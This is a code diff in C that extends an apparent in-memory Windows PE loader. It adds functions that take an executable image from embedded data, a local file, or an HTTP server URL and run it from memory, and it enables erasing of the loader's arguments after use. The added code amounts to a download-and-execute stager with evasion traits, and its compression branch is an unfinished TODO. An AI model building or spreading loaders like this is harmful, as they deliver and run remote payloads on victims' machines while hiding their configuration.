@@ -1,5 +1,7 @@
 #include "c_types.h"
+#include "windows_t.h"
 #include "rel_addr.h"
+#include "lib_memory.h"
 #include "errno.h"
 #include "runtime.h"
 #include "pe_loader.h"
@@ -8,6 +10,11 @@
 
 static errno loadOption(Runtime_Opts* options);
 static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config);
+static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
+
+static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
+static void* loadImageFromFile(Runtime_M* runtime, byte* config);
+static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
 
 errno Boot()
 {
@@ -28,11 +35,6 @@ errno Boot()
     {
         return GetLastErrno();
     }
-
-    // byte  path[] = { '1', '.', 'e', 'x','e',0x00 };
-    // byte* buf;
-    // int64 size;
-    // runtime->WinFile.ReadFileA(path, &buf, &size);
 
     // load config and initialize PE Loader
     PELoader_Cfg config = {
@@ -64,9 +66,10 @@ errno Boot()
             err = GetLastErrno();
             break;
         }
+        runtime->Memory.Free(config.Image);
         break;
     }
-    // runtime->Argument.EraseAll();
+    runtime->Argument.EraseAll();
     if (err != NO_ERROR || loader == NULL)
     {
         runtime->Core.Exit();
@@ -131,6 +134,12 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_EMPTY_PE_IMAGE_DATA;
     }
+    void* image = loadImage(runtime, config->Image, size);
+    if (image == NULL)
+    {
+        return GetLastErrno();
+    }
+    config->Image = image;
     // load command line ANSI, it can be empty
     if (!runtime->Argument.GetPointer(ARG_IDX_CMDLINE_A, &config->CommandLineA, &size))
     {
@@ -186,4 +195,84 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
         return ERR_INVALID_WAIT_MAIN;
     }
     return NO_ERROR;
+}
+
+static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
+{
+    if (size < 4)
+    {
+        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
+        return NULL;
+    }
+    byte mode = *config;
+    config++;
+    switch (mode)
+    {
+    case MODE_EMBED_IMAGE:
+        return loadImageFromEmbed(runtime, config);
+    case MODE_LOCAL_FILE:
+        return loadImageFromFile(runtime, config);
+    case MODE_HTTP_SERVER:
+        return loadImageFromHTTP(runtime, config);
+    default:
+        SetLastErrno(ERR_INVALID_LOAD_MODE);
+        return NULL;
+    }
+}
+
+static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
+{
+    byte mode = *config;
+    config++;
+    switch (mode)
+    {
+    case 0: // without compression
+        uint32 size = *(uint32*)config;
+        void* buf = runtime->Memory.Alloc(size);
+        mem_copy(buf, config + 4, size);
+        return buf;
+    case 1: // use compression
+        // TODO
+        // runtime->Compressor.Decompress();
+        return config;
+    default:
+        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
+        return NULL;
+    }
+}
+
+static void* loadImageFromFile(Runtime_M* runtime, byte* config)
+{
+    byte* buf  = NULL;
+    uint  size = 0;
+    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &buf, &size);
+    if (errno != NO_ERROR)
+    {
+        SetLastErrno(errno);
+        return NULL;
+    }
+    if (size < 64)
+    {
+        SetLastErrno(ERR_INVALID_PE_IMAGE);
+        return NULL;
+    }
+    return buf;
+}
+
+static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
+{
+    HTTP_Resp resp;
+    mem_init(&resp, sizeof(resp));
+    errno errno = runtime->WinHTTP.Get((UTF16)config, NULL, &resp);
+    if (errno != NO_ERROR)
+    {
+        SetLastErrno(errno);
+        return NULL;
+    }
+    if (resp.Body.Size < 64)
+    {
+        SetLastErrno(ERR_INVALID_PE_IMAGE);
+        return NULL;
+    }
+    return resp.Body.Buf;
 }
